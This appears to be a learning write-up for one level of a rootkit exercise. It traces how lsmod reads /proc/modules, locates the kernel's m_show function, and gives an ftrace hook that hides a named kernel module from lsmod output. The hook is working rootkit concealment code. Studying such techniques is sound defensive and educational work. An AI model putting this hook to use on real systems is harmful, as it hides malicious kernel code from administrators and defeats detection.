# level 6

the way I aproached this is trying to understand what happens under the hood when I do lsmod.

so here like before I did some strace, and tried to understand what is happening there.

 I saw it opening /sys/module/{module_name},

```
openat(AT_FDCWD, "/sys/module/aesni_intel/holders", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
```

 but unlike previous levels, it didn't call getdents64 on /sys/module.

instead, it did this:

```
openat(AT_FDCWD, "/proc/modules", O_RDONLY|O_CLOEXEC) = 3
```

before all the /sys/module stuff.

so I checked this file and it indeed contained data about all the kernel modules.

so what lsmod does is

1. read /proc/modules
2. for each entry read /sys/module/{module}, parse output and pretty-print it.

Since /proc/modules is in /proc, there is probably a kernel function which is responsible for returning the data,
because /proc is a virtual filesystem.

so now I need to find the function.

here I tried to use [trace-cmd](https://lwn.net/Articles/410200/) for this:

```
sudo trace-cmd record  -p function_graph cat /proc/modules
```

but it returned way too much information:

```
sudo trace-cmd report | wc -l
82883
```

so I tried narrowing it down by grepping 'module', and got to this:

modules_open() which is defined in [kernel/module.c](https://elixir.bootlin.com/linux/latest/source/kernel/module.c#L4641).

so I figured it must be around this area of code in the kernel.

I looked at kernel the functions and code in the file a little bit and found this:

```c
#ifdef CONFIG_PROC_FS
/* Called by the /proc file system to return a list of modules. */
static void *m_start(struct seq_file *m, loff_t *pos)
{
	mutex_lock(&module_mutex);
	return seq_list_start(&modules, *pos);
}
```

this looks relevant to my cause.

So it seems like this

```c
static int m_show(struct seq_file *m, void *p)
{
	struct module *mod = list_entry(p, struct module, list);
	char buf[MODULE_FLAGS_BUF_SIZE];
	void *value;

	/* We always ignore unformed modules. */
	if (mod->state == MODULE_STATE_UNFORMED)
		return 0;

	seq_printf(m, "%s %u",
		   mod->name, mod->init_layout.size + mod->core_layout.size);
	print_unload_info(m, mod);

	/* Informative for users. */
	seq_printf(m, " %s",
		   mod->state == MODULE_STATE_GOING ? "Unloading" :
		   mod->state == MODULE_STATE_COMING ? "Loading" :
		   "Live");
	/* Used by oprofile and other similar tools. */
	value = m->private ? NULL : mod->core_layout.base;
	seq_printf(m, " 0x%px", value);

	/* Taints info */
	if (mod->taints)
		seq_printf(m, " %s", module_flags(mod, buf));

	seq_puts(m, "\n");
	return 0;
}
```

is our culprit function that prints out the module lines. 

like in level 4, this function seems to only print the kernel module information and then return, which means that I can easily hook and mess it up and nothing truely "bad" will happen.

so lets hook it with ftrace like before!

```c
static asmlinkage int new_m_show(struct seq_file *m, void *p)
{
	struct module *mod = list_entry(p, struct module, list);
	if (strcmp(mod->name, "module_hiding_rootkit") == 0)
	{
		printk(KERN_INFO "not so fast amigo\n");
		seq_puts(m,"\n");
		return 0;	
	}
	return old_m_show(m, p);
}
```

the above hook worked, the problem is \n is not good here because he tries to read a file from sys/modules named "\n" and fails.

so ```seq_puts(m,"");``` does the job here.

now I can hide arbitrary kernel modules from commands like lsmod.


